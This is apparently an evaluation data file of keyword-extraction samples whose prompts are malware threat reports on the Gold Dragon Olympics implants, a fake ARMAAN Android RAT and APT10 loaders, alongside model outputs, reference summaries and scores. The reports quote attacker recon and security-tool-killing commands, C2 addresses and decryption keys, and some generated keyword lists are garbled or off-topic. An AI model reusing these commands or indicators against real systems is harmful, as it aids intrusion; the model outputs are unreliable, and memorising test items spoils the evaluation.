[{"split_name": "val", "sample_id": "val_0", "prompt_text": "Extract the keywords: (url\uf002\uf0e1\uf09a\uf099 \uf0d5 \uf09eGold Dragon Widens Olympics Malware Attacks, Gains Permanent Presence on Victims\u2019 SystemsBy Ryan Sherstobito  (url /) and Jessica Saavedra-Morales (url on Feb 02, 2018 (url Advanced Threat Research (ATR) recently released a report (url labs/malicious-document-targets-pyeongchang-olympics/) describing a  leless attack targeting organizations involved with the Pyeongchang Olympics. The attack used a PowerShell implant that established a channel to the attacker\u2019s server to gather basic system-level data. What was not determined at that time was what occurred after the attacker gained access to the victim\u2019s system.McAfee ATR has now discovered additional implants that are part of an operation to gain persistence for continued data ex ltration and for targeted access. We have named these implants, which appeared in December 2017, Gold Dragon, Brave Prince, Ghost419, and Running Rat, based on phrases in their code.On December 24, 2017, our analysts observed the Korean-language implant Gold Dragon. We now believe this implant is the second-stage payload in the Olympics attack that ATR discovered January 6, 2018. The PowerShell implant used in the Olympics campaign was a stager based on the PowerShell Empire framework that created an encrypted channel to the attacker\u2019s server. However, this implant required additional modules to be executed to be a fully capable backdoor. In addition, the PowerShell implant did not contain a mechanism to persist beyond a simple scheduled task. Gold Dragon has a much more robust persistence mechanism than the initial PowerShell implant and enables the attacker to do much more to the target system. Gold Dragon reappeared the same day that the Olympics campaign began.The Gold Dragon malware appears to have expanded capabilities for pro ling a target\u2019s system and sending the results to a control server. The PowerShell implant had only basic data-gathering capabilities\u2014such as username, domain, machine name, and network con guration\u2014which are useful only for identifying interesting victims and launching more complex malware against them.Gold DragonGold Dragon is a data-gathering implant observed in the wild since December 24. Gold Dragon gets its name from the hardcoded domain www.golddragon.com, which we found throughout the samples.This sample acts as a reconnaissance tool and downloader for subsequent payloads of the malware infection and payload chain. Apart from downloading and executing binaries from the control server, Gold Dragon generates a key to encrypt data that the implant obtains from the system. This URL is not used for control; the encrypted data is sent to the server ink.inkboom.co.kr, which was used by previous implants as early as May 2017.Gold Dragon contains elements, code, and similar behavior to implants Ghost419 and Brave Prince, which we have tracked since May 2017. A DLL-based implant created on December 21 (the same day the  rst malicious Olympics document appeared) was downloaded by a Gold Dragon variant created December 24. This variant was created three days before the targeted spear phishing email with the second document that was sent to 333 victim organizations. The December 24 variant of Gold Dragon used the control server nid-help-pchange.atwebpages.com, which was also used by a Brave Prince variant from December 21.The  rst variants of Gold Dragon appeared in the wild in South Korea in July 2017. The original Gold Dragon had the  le name .exe, which translates as Hangul Extraction and was seen exclusively in South Korea. Five variants of Gold Dragon compiled December 24 appeared heavily during the targeting of the Olympics organizations.Analyzing Gold DragonAs part of its initialization, Gold Dragon:Builds its imports by dynamically loading multiple APIs from multiple libraries Gains debug privileges (\u201cSeDebugPrivilege\u201d) for its own process to read remote memory residing in other processesThe malware does not establish persistence for itself but for another component (if it is found) on the system:The malware begins by looking for an instance of the Hangul word processor (HWP) running on the system. (HWP is a Korean word processor similar to Microsoft Word.)Checking for HWP.exe in the process list.If HWP.exe is found running on the system, the malware  nds the currently open  le in HWP by extracting the  le path from the command-line argument passed to HWP.exe This word  le (usually named *.hwp) is copied into the temporary  le pathC:\\DOCUME~1\\<username>\\LOCALS~1\\Temp\\2.hwphwp is an exact copy of the  le loaded into HWP.exe The malware reads the contents of 2.hwp and  nds an \u201cMZ magic marker\u201d in the  le indicated by the string \u201cJOYBERTM\u201dChecking for the MZ marker in the HWP  le.This marker indicates the presence of an encrypted MZ marker in the .hwp  le and is decrypted by the malware and written to the Startup folder for the user:C:\\Documents and Settings\\<username>\\Start Menu\\Programs\\Startup\\viso.exeThis step establishes the persistence of the malware across reboots on the endpoint Once the decrypted MZ marker is written to the Startup folder, the 2.hwp is deleted from the endpointThe malware might perform this activity for a couple of reasons:Establish persistence for itself on the endpoint Establish persistence of another component of the malware on the endpoint Update itself on endpoint after a separate updater component downloads the update from the control serverThe malware has limited reconnaissance and data-gathering capabilities and is not full- edged spyware. Any information gathered from the endpoint is  rst stored in the following  le, encrypted, and sent to the control server:C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwpThe following information is gathered from the endpoint, stored in the  le 1.hwp, and sent to the control server:Directory listing of the user\u2019s Desktop folder using command:cmd.exe /c dir C:\\DOCUME~1\\<username>\\Desktop\\ >> C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwpDirectory listing of the user\u2019s recently accessed  les using command:cmd.exe /c dir C:\\DOCUME~1\\<username>\\Recent >> C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwpDirectory listing of the system\u2019s %program les% folder using command:cmd.exe /c dir C:\\PROGRA~1\\ >> C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwpSysteminfo of the endpoint using command:cmd.exe /c systeminfo >> C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwpCopies the  le ixe000.bin from:C:\\Documents and Settings\\<username>\\Application Data\\Microsoft\\Windows\\UserPro les\\ixe000.binTo:C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwpRegistry key and value information for the current user\u2019s Run key (with information collected):HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunNumber of subkeys(<KeyIndex>) <KeyName>Number of Values under each key including the parent Run key(<ValueIndex>) <Value_Name> <Value_Content>Registry Run key enumeration by Gold Dragon.An example of 1.hwp with registry and system information:Gold Dragon executes these steps executed in the ex ltration process:Once the malware has gathered the required data from the endpoint, it encrypts the data  le 1.hwp using the password \u201cwww[dot]GoldDragon[dot]com\u201d The encrypted content is written to the data  le 1.hwp. During the ex ltration process, the malware Base64-encodes the encrypted data and sends it to its control server using an HTTP POST request to the URL:url data/parameters used in the request include:Content-Type: multipart/form-data; boundary=\u2014-WebKitFormBoundar ywhpFxMBe19cSjFnG <followed by base64 encoded & encrypted system info> User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 1.1.4322) Accept-Language: en-us HTTP Version: HTTP/1.0The malware can also download and execute additional components served to it by the control server. The mechanism for downloading additional components is based on the Computer Name and UserName of the endpoint provided by the malware process to the control server in the following HTTP GET request:GET url lename= <Computer_Name>_<username>&continue=dnsadminAfter successfully retrieving the component from the control server, the next-stage payload is copied to the Application Data directory of the current user and executed:C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\hupdate.ex(note \u201cex,\u201d not \u201cexe\u201d)The capability to download additional components from the control server.The malware demonstrates its evasive behavior by checking for the presence of speci c processes related to antimalware products:The presence of any process with the keywords \u201cv3\u201d and \u201ccleaner.\u201dChecking for antimalware or cleaner processes.If found, these processes are terminated by sending a WM_CLOSE message to their windowing threads.Terminating an antimalware/cleaner process.Brave PrinceBrave Prince is a Korean-language implant that contains similar code and behavior to the Gold Dragon variants, speci cally the system pro ling and control server communication mechanism. The malware gathers detailed logs about the victim\u2019s con guration, contents of the hard drive, registry, scheduled tasks, running processes, and more. Brave Prince was  rst observed in the wild December 13, 2017, sending logs to the attacker via South Korea\u2019s Daum email service. Later variants posted the data to a web server via an HTTP post command, in the same way that Gold Dragon does.The embedded domain braveprince.com.The Daum variants of Brave Prince gather information from the system and save it to the  le PI_00.dat. This  le is sent as an attachment to the attacker\u2019s email address. Later variants upload the  le to a web server via an HTTP post command. The type of data this implant gathers from the victim\u2019s system:Directories and  les Network con guration Address resolution protocol cache Systemcon g to gather tasksBoth variants of Brave Prince can kill a process associated with a tool created by Daum that can block malicious code. This tool is exclusive to South Korea.taskkill /f /im daumcleaner.exeThe later variants of Brave Prince include the following hardcoded strings:c:\\utils\\c2ae_uiproxy.exe c:\\users\\sales\\appdata\\local\\temp\\dwrrypm.dlGhost419Ghost419 is a Korean-language implant that  rst appeared in the wild December 18, 2017, with the most recent sample appearing two days before the Olympics spear phishing email. The malware can be identi ed by the hardcoded string and URL parameter passed to the control server. Ghost419 can be traced to a sample created July 29, 2017, that appears to be a much earlier version (without the hardcoded identi er). The July version shares 46% of its code with samples created in late December. This early version implant creates a unique mutex value (kjie23948_34238958_KJ238742) that also appears in a sample from December, with the exception that one digit has changed. Ghost419 is based on Gold Dragon and Brave Prince implants and contains shared elements and code, especially for system reconnaissance functions.Hardcoded \u201cGhost419\u201d in the malware binary.The string \u201cWebKitFormBoundarywhpFxMBe19cSjFnG,\u201d part of the upload mechanism, also appears in the Gold Dragon variants of late December 2017.Gold Dragon sample.Ghost419 sample.Numerous other similarities are present in addition to system reconnaissance methods; the communication mechanism uses the same user agent string as Gold Dragon.Gold Dragon user agent string.Ghost419 user agent string.RunningRatRunningRat is a remote access Trojan (RAT) that operates with two DLLs. It gets its name from a hardcoded string embedded in the malware. Upon being dropped onto a system, the  rst DLL executes. This DLL serves three main functions: killing antimalware, unpacking and executing the main RAT DLL, and obtaining persistence. The malware drops the Windows batch  le dx.bat, which attempts to kill the task daumcleaner.exe; a Korean security program. The batch  le then attempts to remove itself.The  rst DLL unpacks a resource  le attached to the DLL using a zlib decompression algorithm. The authors of the malware left the debugging strings in the binary, making the algorithm easy to identify. The second DLL is decompressed in memory and never touches the user\u2019s  le system; this  le is the main RAT that executes. Finally, the  rst DLL adds the registry key \u201cSysRat,\u201d at SoftWare\\Microsoft\\Windows\\CurrentVersion\\Run, to ensure the malware is executed at startup.After the second DLL is loaded into memory, the  rst DLL overwrites the IP address for the control server, e ectively version, and driver and processor information.The malware initiates its main function of capturing user keystrokes and sending them to the control server using standard Windows networking APIs.From our analysis, stealing keystrokes is the main function of RunningRat; however, the DLL has code for more extensive functionality. Code is included to copy the clipboard, delete  les, compress  les, clear event logs, shut down the machine, and much more. However, our current analysis shows no way for such code to be executed.McAfee ATR analysts will continue to research RunningRat to determine if this extra code is used or is possibly left over from a larger RAT toolkit.The second DLL employs a few additional antidebugging techniques. One is the use of a custom exception handler and code paths that are designed to generate exceptions.There are also a few random empty-nested threads to slow down researchers during static analysis.The  nal antidebugging technique involves GetTickCount performance counters, which are placed within the main sections of code to detect any delay a debugger adds during runtime.ConclusionThe PowerShell script  rst discovered by McAfee ATR was delivered via a spear phishing campaign that used image stenography techniques to hide the  rst-stage implant. (For more on steganography, see the McAfee Labs Threats Report, June 2017, (url page 33.)The implants covered in this research establish a permanent presence on the victim\u2019s system once the PowerShell implant is executed. The implants are delivered as a second stage once the attacker gains an initial foothold using  leless malware. Some of the implants will maintain their persistence only if Hangul Word, which is speci c to South Korea, is running.With the discovery of these implants, we now have a better understanding of the scope of this operation. Gold Dragon, Brave Prince, Ghost419, and RunningRat demonstrate a much wider campaign than previously known. The persistent data ex ltration we see from these implants could give the attacker a potential advantage during the Olympics.We thank Charles Crawford and Asheer Malhotra for their support of this analysis.Indicators of CompromiseIPs194.70.136Domains000webhostapp.com nid-help-pchange.atwebpages.com inkboom.co.kr \uf02c Tags: advanced persistent threats (url cybersecurity (url endpoint protection (url malware (url a replyFacebook Comments (0) Comments (0) G+ Comments 0 CommentsAdd a comment Facebook Comments PluginSort byOldest ", "generated_text": "the document; Pyeongchang Olympics; December 2017; the implants; PowerShell implant; the attacker; data; the implant; data-gathering capabilities; the system; a DLL-based implant; 20; 2016; the initial PowerShell implant; persistence; another component; Hangul Extraction; the system; the initial PowerShell implant; the malware; a command; control; different telemetry commands; Sqrt; control servers; interest; C2; the attacker; triads; the attacker; the system; the attacks; a DLL; the malware; execution; Indicators; persistence; strong resiliency; execution; China.", "ref_text": "<START-1>The document discusses malware campaigns targeting organizations involved with the 2018 Pyeongchang Winter Olympics. Security researchers at McAfee uncovered new malware implants associated with intrusion activity that began in December 2017 with a PowerShell implant delivering basic system information to the attackers. The new implants discovered include: Gold Dragon - Gathers system information and profiles the victim system. It establishes persistence on machines running the Korean word processor Hangul. Brave Prince - Korean-language implant that profiles system config and contents. Exfiltrates data via email and HTTP posts. Ghost419 - Based on Gold Dragon and Brave Prince. Gathers system reconnaissance information. RunningRat - Remote access Trojan that captures keystrokes and exfiltrates them. Contains additional unused functionality. The tactics, techniques, and infrastructure analysis indicates these new implants are part of the same intrusion set that targeted the Olympics with the initial PowerShell implant. The expanded capabilities enable long-term persistence and data exfiltration from victim networks. The implants demonstrate anti-analysis and anti-forensics techniques. The campaign establishes permanent system access exploiting the high profile nature of the Olympics. McAfee assesses with high confidence the activity is part of a nation-state sponsored cyber espionage operation. <END-1>", "t5/keyword/hint_hit_precision": 0.175, "t5/word/hint_hit_recall": 0.07368421052631578, "gpt3/lexical/rouge_rouge1": 0.4364820846905537, "gpt3/lexical/rouge_rouge2": 0.15081967213114755, "gpt3/lexical/rouge_rougeL": 0.24104234527687296, "gpt3/lexical/rouge_rougeLsum": 0.24104234527687296, "gpt3_generated_text": ["The article discusses a malware attack targeting organizations involved with the Pyeongchang Olympics, with new implants named Gold Dragon, Brave Prince, Ghost419, and Running Rat. The Gold Dragon implant, discovered in December 2017, serves as a second-stage payload in the attack, providing robust persistence and expanded data-gathering capabilities. The malware gathers system information, encrypts data, and communicates with control servers for further instructions. Gold Dragon shares similarities with Ghost419 and Brave Prince implants, with a DLL-based variant appearing in December 2017. The malware establishes persistence through a Korean word processor and exhibits strong resiliency. This sophisticated attack highlights the evolving tactics used by attackers to gain access and maintain control over victim systems."]}, {"split_name": "val", "sample_id": "val_1", "prompt_text": "Extract the keywords: Indian Army Personnel Face Remote Access Trojan Attacksblog.cyble.com/2022/01/28/indian-army-personnel-face-remote-access-trojan-attacks/January 28, 2022Cyble Research Labs has come across a Twitter post wherein security researchers have brought to focus an Android malware that pretends to be the legitimate ARMAAN application. The Army Mobile Aadhaar App Network (ARMAAN) is an umbrella application covering various facets of information & services concerning all ranks of the Indian Army, and the app is used only by Indian Army personnel. Threat Actors (TAs) have customized the legitimate ARMAAN app and added malicious code into it.During our analysis, we observed that this malicious application uses the icon, name, and even source code of the legitimate ARMAAN app. To create this malicious application, attackers have added an extra package in the legitimate application\u2019s source code to enable it to perform RAT activities.From our analysis, we concluded that upon successful execution, this malicious application could steal sensitive data such as contacts, call logs, SMSes, location, files from external storage, record audio, etc., from the victims\u2019 devices.Technical Analysis APK Metadata InformationApp Name: ARMAAN Package Name: in.gov.armaan shown in the figure below.Figure 2 \u2013 App Icon and Name2/10Figure 3 \u2013 App Requests KYC DocumentsWhen the user inputs the AADHAAR number, the malware communicates with the official ARMAAN server to verify the account, as shown below.Figure 4 \u2013 App Communicates to Legitimate ServerOn comparing the legitimate ARMAAN application and the modified malicious ARMAAN application, we identified that the TAs have added an extra package containing malicious code, as shown in the figure below.3/10Figure 5 \u2013 Added Source Code Package in Malicious AppManifest Description The malware requests the user for 22 different permissions. Out of these, it abuses ten permissions. These dangerous permissions are listed below.PermissionsREAD_SMSRECEIVE_SMSREAD_CALL_LOGREAD_CONTACTSREAD_PHONE_STATERECORD_AUDIOACCESS_COARSE_LOCATIONACCESS_FINE_LOCATIONDescriptionAccess SMSes in the device database (DB).Intercept SMSes received on the victim\u2019s deviceAccess Call LogsAccess phone contacts.Allows access to phone state, including the current cellular network information, the phone number and the serial number of the phone, the status of any ongoing calls, and a list of any Phone Accounts registered on the device.Allows the app to record audio with the microphone, which the attackers can misuse.Allows the app to get the approximate location of the device network sources such as cell towers and Wi-Fi.Allows the app to get the device\u2019s precise location using the Global Positioning System (GPS).ACCESS_BACKGROUND_LOCATION Allows an app to access location in the background.ACCESS_WIFI_STATEAllows the app to get information about Wi-Fi connectivity.We observed added services and receivers entries in the manifest file of the malicious app, as shown in Figure 6.4/10Figure 6 \u2013 Added Entries in ManifestIt is also observed in the manifest that the TAs have added dangerous permissions entries such as READ_CONTACTS, READ_CALL_LOG, RECORD_AUDIO, ACCESS_COARSE_LOCATION, etc. in modified malicious ARMAAN applications.Figure 7 \u2013 Added Permissions Entry in Malicious APPSource Code Review Our static analysis indicated that the malware steals sensitive data such as Contacts, SMSes, and Call logs, besides recording audio and taking pictures from the camera, etc., on commands from the C&C.The malware uses a fixed hardcoded array containing the IP\u2019s ASCII values: 173[.]212.220.230 and port: 3617 Details. The malware then converts and uses them for its C&C communication, as shown in Figure 8.5/10Figure 8 \u2013 Malware CommunicationThe getAlluserInfo() method has been used to collect the user\u2019s device information such as phone number, device manufacturer\u2019s details, etc., from the device, as shown in Figure 9.Figure 9 \u2013 Collects User\u2019s InformationThrough the getAllSMS() method, we identified that the malware collects SMSs data from the device, as shown in the below figure.6/10The method getAllContacts() has been used to collect Contacts data from the device, as shown below.Figure 10 \u2013 Code to Collect SMSsFigure 11 \u2013 Code to Collect Contacts DataMethod getAllCallLogs() depicts the malware\u2019s ability to collect Call logs data from the device. Refer to Figure 12.Figure 12 \u2013 Code to Collect Call logsThe code snippet shown in the below image depicts the malware\u2019s ability to collect the device\u2019s location data from the device.Figure 13 \u2013 Collects Location Data from the DeviceThe image shown below showcases the malware\u2019s code that collects and sends images from the WhatsApp directory in the device to the server on commands from the TAs.Figure 14 \u2013 Steals Images from WhatsApp Directory7/10The method sentMicRecording() shown in the below image depicts the malware\u2019s ability to record mic and send the recorded data to the server on the TAs command. After the data is sent, the malware deletes the file.The below figure represents the malware\u2019s ability to capture images from the front and back camera and send the recorded data to the server on the TAs command.Figure 15 \u2013 Records MicFigure 16 \u2013 Capture Images from Front and Back CameraThe malware collects the document files from the device through the remainingDocumentFiles() method shown in the figure below.Below are the commands used by the TA to control the infected device:Figure 17 \u2013 Code to Collect Document Files8/10Command DescriptionD%r6t*Get SMS datas%7n@2Get Contacts datai*g4#3Get Call logs dataO@y7J&Start mic recording5w$I!71^R$4tj*7e@4Get document filesGet images from the WhatsApp folderClick photos from the device cameraA website with the domain name hxxps://armaanapp[.]in was registered around a year ago. It seems that TAs used this website to deliver malicious versions of the ARMAAN application, as shown in the below figure below.Figure 18 \u2013 Fake WebsiteConclusion The modified, malicious ARMAAN app poses a serious threat to the Indian Armed Forces. It can perform RAT activities with the potential to steal Indian Army personnel\u2019s sensitive data, including contacts, call logs, SMSes, Location, and files from external storage, in addition to the ability to record sensitive audio.TAs constantly adapt their methods to avoid detection and find new ways to target users through increasingly sophisticated techniques. Such malicious applications often masquerade as legitimate applications to trick users into installing them. This situation makes it imperative for users to install applications only after verifying their authenticity. Apps should only be installed exclusively via the official Google Play Store and other trusted portals to avoid such attacks.Our Recommendations We have listed some essential cybersecurity best practices that create the first line of control against attackers. We recommend that our readers follow the best practices given below:How to prevent malware infection?Download and install software only from official app stores like Google Play Store or the iOS App Store. Use a reputed anti-virus and internet security software package on your connected devices, such as PCs, laptops, and mobile devices. Use strong passwords and enforce multi-factor authentication wherever possible. Enable biometric security features such as fingerprint or facial recognition for unlocking the mobile device where possible. Be wary of opening any links received via SMS or emails delivered to your phone. Ensure that Google Play Protect is enabled on Android devices. Be careful while enabling any permissions. Keep your devices, operating systems, and applications updated.9/10How to identify whether you are infected?Regularly check the Mobile/Wi-Fi data usage of applications installed in mobile devices. Keep an eye on the alerts provided by Anti-viruses and Android OS and take necessary actions accordingly.What to do when you are infected?Disable Wi-Fi/Mobile data and remove SIM card \u2013 as in some cases, the malware can re-enable the Mobile Data. Perform a factory reset. Remove the application in case a factory reset is not possible. Take a backup of personal media Files (excluding mobile applications) and perform a device reset.What to do in case of any fraudulent transaction?In case of a fraudulent transaction, immediately report it to the concerned bank.What should banks do to protect their customers?Banks and other financial entities should educate customers on safeguarding themselves from malware attacks via telephone, SMSes, or emails.MITRE ATT&CK\u00ae TechniquesTacticInitial AccessInitial AccessExecutionCollectionCollectionCollectionCollectionCollectionCollectionCollectionTechnique ID Technique NameT1476T1444T1575T1433T1412T1432T1429T1512T1533T1430Deliver Malicious App via Other Mean.Masquerade as Legitimate ApplicationNative CodeAccess Call LogCapture SMS MessagesAccess Contact ListCapture AudioCapture CameraData from Local SystemLocation TrackingCommand and Control T1436Commonly Used PortsIndicators of Compromise (IOCs)IndicatorsIndicator ", "generated_text": "the malware; Indian Army Personnel; the app; the legitimate ARMAAN application; malicious code; the app; RAT activities; the user; 22 different permissions; ten; commands; SSH; SMSs; Call Logs; location; files; external storage; data; the user; IP; The IP; IP address; the C&C; the user; the user; commands; the C&C; ip; data; a fixed hardcoded array; the IP; ASCII values; 173[.]212.220.230; port; 3617 Details; The IP.", "ref_text": "<START-1> The blog post analyzes a malware that pretends to be the legitimate Indian Army application called ARMAAN. This Android malware adds malicious code to the real ARMAAN app to turn it into spyware targeting Indian Army personnel. The malware uses the same icon, name, and some source code as the real app. It requests extensive permissions like reading SMS, contacts, call logs, location, etc. Technical analysis shows it exfiltrates sensitive data like SMS, contacts, call logs, files, images, location, and can record audio and take photos. The malware communicates with a hardcoded command and control server to receive commands. It can steal data, record audio/video, and more based on commands received. The blog identifies a fake website seemingly used to distribute the malware disguised as the real app. It highlights the serious threat posed by such spyware targeting the Indian military and provides recommendations on how to prevent, identify, and respond to such malware. In summary, the post analyzes an Android spyware masquerading as an official Indian Army app to compromise devices of military personnel and exfiltrate sensitive data. It provides technical details on the malware's capabilities and operation. <END-1>", "t5/keyword/hint_hit_precision": 0.25, "t5/word/hint_hit_recall": 0.07407407407407407, "gpt3/lexical/rouge_rouge1": 0.436241610738255, "gpt3/lexical/rouge_rouge2": 0.1554054054054054, "gpt3/lexical/rouge_rougeL": 0.24161073825503354, "gpt3/lexical/rouge_rougeLsum": 0.24161073825503354, "gpt3_generated_text": ["Indian Army personnel are facing Remote Access Trojan (RAT) attacks through a malicious application posing as the legitimate ARMAAN app. This malware, disguised as the Army Mobile Aadhaar App Network, steals sensitive data such as contacts, call logs, SMSes, location, and files from external storage. The malicious app requests 22 permissions, abusing ten of them, including reading SMSs, call logs, recording audio, and accessing location data. The malware communicates with a hardcoded IP address and port for command and control (C&C) activities. It collects user information, SMS data, and contacts from the device. Indian Army personnel must be cautious of these attacks targeting their personal information."]}, {"split_name": "val", "sample_id": "val_2", "prompt_text": "Extract the keywords: APT10: Tracking down the stealth activity of the A41APT campaignSuguru Ishimaru / Yusuke Niwa / Charles Li / Motohiko Sato / Hajime Yanagishita2020/02/25 GReAT Ideas Green tea editionPresenter / CoauthorCharles Li Team T5 Chief Analyst of TeamT5Hajime Yanagishita Macnica Networks Security ResearcherYusuke Niwa ITOCHU Corporation. ITCCERT Cyber Security ResearcherMotohiko Sato ITOCHU Corporation. ITCCERT Sr. Cyber Security ResearcherSuguru Ishimaru Kaspersky GReAT Malware Researcher2Agenda1. Campaign Overview2. Malware Analysis3. Characteristics of Intrusion4. Threat Actor\u2019s Infrastructure5. Consideration of Threat Actor\u2019s Attribution6. Summary3\uff11\uff0eA41APT Campaign OverviewA41APT Campaign OverviewPeriod of Activity: March 2019 to January 2021Target: Japan (Japanese companies including overseas branches)Infection Vector: SSL-VPN abuse (Could not observed spear-phishing)Implants: DESLoader, SodaMaster, P8RAT and FYAntiLoader etc.Characteristics: Very tough to detect attacker\u2019s intrusionWe call this threat campaign A41APT from the hostname feature \u201cDESKTOP-A41UVJV\u201d that is continuously used during the initial intrusion.5Public info\u3010\u30ec\u30dd\u30fc\u30c8\u3011Microsoft\u306e\u30c7\u30b8\u30bf\u30eb\u30d5\u30a1\u30a4\u30eb\u3092 \u3059\u308b\u300cSigLoader\u300d\u306b\u3088\u308b\u3092 [1]Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign[2]@Int2e_\u2019s tweet[3]Attacks Exploiting Vulnerabilities in Pulse Connect Secure[4]6\uff12\uff0eMalware Analysis\uff12\uff0e Malware Analysis1.DESLoader1.Payloads of DESLoader\u2022 SodaMaster \u2022 P8RAT \u2022 FYAntiLoader \u21d2 .NET Loader(ConfuserEx v1.0.0) \u21d2 xRAT82-1\uff0eDESLoaderAka. SigLoader, Ecipekac, HEAVYHAND\uf071 Unique multi-layer loader for payloadspolicytool.exeLegitimate EXE\uf071 Use 4 files in the same directory\uf071 DLL Side-Loading\uf071 DLLs contains encrypted shellcode ofLayer II and IV loader.\uf071 Layer II, III, IV loaders and payload arevac.dllfileless implants.Layer I loader for side-loadingjli.dllDLL contains encrypted shellcode: Layer II loaderDLL contains encrypted shellcode: Layer IV loaderpcasvc.dll9Example of DESLoader's payload loading flowside-loadingloaddecryptreflective dll injectionfileless implantspolicytool.exe Legitimate EXEjli.dllLayer Ivac.dllloadshellcode1 Layer IIembedded DLL1Layer IIIdecryptreflective dll injectionpcasvc.dllshellcode2Layer IVembedded DLL2PayloadLayer I: junk codes are found using OutputDebugStringA(), _time64(), rand(), srand() for anti-reversingJunk code10jli.dll: Layer I LoaderMultiple algorithms (XOR, DES, AES and RSA) are implemented, and the order of using them is configured. It read encrypted data in vac.dll from the end of data till configured size and decrypt.loaddecryptjli.dllLayer Ivac.dllMZPESection table + Section 1 \u2026 NEmbedded dataDefined crypto algorithmsshellcode1 Layer II skipped 1. XORkey = 0x9F skipped 2. AES (CBC mode)key = 83H4uREKfFClDH8ziYTH8xsBYa32p3wl IV = 83H4uREKfFClDH8z skipped 11shellcode1: Layer II LoaderLayer II Loader checks magic_bytes \"ecipekac\"(or \u201c9F 8F 7F 6F\u201d or \u201cBF AF BF AF\u201d). Then, it reconstructs and loads each part of the embedded DLL1 in the correct order of PE format for reflective DLL injection.reflective dll injectionshellcode1 Layer IIshellcodeecipekac Size of buf Size of codeSection table 0x00c050x39a1d0x39b250x000000x000E00x001E80x010000xXXXXXembedded DLL1Layer IIIMZ PESection tableSection 1Section N12embedded PE1: Layer III LoaderLayer III Loader is similar to Layer I Loader. The sequence of algorithms is in the reverse order compared to the layer I Loader. The hardcoded keys are also different respectively.loaddecrypt1.AES key = K4jcj02QSLWp8lK9gMK9h7W0L9iB2eEW, IV = K4jcj02QSLWp8lK9shellcode2Layer IVembedded DLL1Layer IIIDefined crypto algorithmspcasvc.dllMZPESection table + Section 1 \u2026 NEmbedded data2.XOR key = 0x5E13shellcode2: Layer IV LoaderThree different types of shellcode were confirmed as Layer IV loader:1. Similar to Layer II shellcode for P8RAT and FYAnti loader2. Cobalt strike\u2019s stager shellcodereflective dll injection3. Shellcode dedicated for SodaMastershellcode2Layer IVembedded DLL2Payloadoffsetdatadescription0x00090 90 90 90 90 90 90 90magic bytes for Identification, this is used for comparision before data processing0x0080x11600Size of encrypted data, only this value (size) is observedshellcode2 Layer IV for SodaMaster contains data structure0x00C0x01CA9 5B 7B 84 9C CB CF E8 B6 79 F1 9F 05 B6 2B FEC7 36 7E 93 D3 07 1E 86 23 75 10 49 C8 AD 01 9F [skipped]16 bytes RC4 key (each sample has different key)Encrypted SodaMaster payload with RC414DESLoader TimeLineThe timeline of DESLoader based on compilation time. Also shown filename and its payloads. (+Cobalt Strike\u2019s stager)jli.dllWTSAPI32.DLLNETAPI32.DLLSECUR32.dllDBUS-1-3.DLLVMTOOLS.DLLSodaMasterjli.dllvmtools.dlljli.dllJLI.dlljli.dllLIBEAY32.DLLsbiedll.dllCobalt Strike\u2019s stagerdbus-1-3.dllSBIEDLL.DLLDBUS-1-3.DLLGLIB-2.0.DLLP8RATuxtheme.dlljli.dllkbb.dllkbb.dllvmtools.dllsbiedll.dllJLI.DLLjli.dllvmtools.dll jli.dllFYAntiCCFIPC64.DLLOct 2019Dec 2019May 2020Jun 2020Jul 2020Sep 2020Oct 2020Dec 2020152-2\uff0ePayloads of DESLoader1. FYAntiLoader\u21d2 .NET Loader(ConfuserEx v1.0.0) \u21d2 xRAT16SodaMasterAka. DelfsCake, dfls, DARKTOWN\uf071 One of DESLoader's payloads\uf071 Fileless RAT(x64/x86)\uf071 Command identifiers are d, f, l and s\uf071 Check VM environment from the followingregistry value \uf0fcHKCR\\Applications\\VMwareHostOpen.exe17SodaMaster\uf071 Mutex value = reverse order ofCRC32 calculated from hardcoded base64 string + 12 bytes\uf071 Initial C2 communication data isencrypted with RSA.\uf071 The RSA key is hardcoded base64key_blob and data contains randomly generated RC4 key\uf071 Further communication data isencrypted with RC4base64(RSA key) + 12bytes dataEncrypted using RSA keyCRC320x8d01ca9fMutex = 9FCA018DUser RC4keyRC4 encryptionSodaMasterC2 server18P8RATAka. GreetCake, HEAVYPOT\uf071 One of DESLoader's payloads\uf071 x64 fileless RAT\uf071 10 backdoor commands.\uf071 Main feature looks command 301:\uf0fc Execution of secondary PEbased payload downloaded into memory\uf071 P8RAT checks VMware and VirtualBox\uf0fc\uf0fcvboxservice.exevmtools.exe19P8RAT backdoor commandsDescription2020-03-302020-08-262020-12-14Compilation time of P8RATClosing socketCreating a thread for executing/loading of a downloaded PENo functionalitySending randomly generated dataExecuting/loading downloaded PE/shellcodeSetting value of \u201cSet Online Time\u201d, and the string of the setting value was removed from the P8RAT which was built on 2020-08-26.EnableEnableEnableEnableEnableEnableEnableEnableEnableEnableRemovedRemovedEnableEnableRemovedRemovedEnableEnableSetting value of \u201cSet Reconnect TimeOut\u201d, and the string of the setting value was removed from the P8RAT which was built on 2020-08-26.EnableEnableEnableSetting value of \u201cSet Reconnect times\u201d, and the string of the setting value was removed from the P8RAT which was built on 2020-08-26.EnableEnableEnableSetting value of \u201cSet Sleep time\u201d, and the string of the setting value was removed from the P8RAT which was built on 2020- 08-26.EnableEnableEnableCreating thread for executing downloaded shellcode was implemented from P8RAT which was built on 2020-12-14.Not implementedNot implementedEnable20cmd300301302303304305306307308309FYAntiLoaderAka. DILLJUICE stage2\uf071 One of DESLoader's payloads\uf071 Fileless type multi-layer loader module\uf071 Provocative Export function name\uf071 Loads .NET Loader using CppHostCLR\uf071 Contains .NET Loader packedwith ConfuserEx v1.0.0\uf071 Finally, Payload is xRAT (QuasarRAT)21Example of FYAntiLoader's payload loading flowside-loadingloaddecryptreflectivedll injectionfileless implantsFYAntiusoclient.exeLegitimate EXECCFIPC64.dllLayer Imsftedit.prf.cooloadshellcode1 Layer IIembedded DLL1Layer 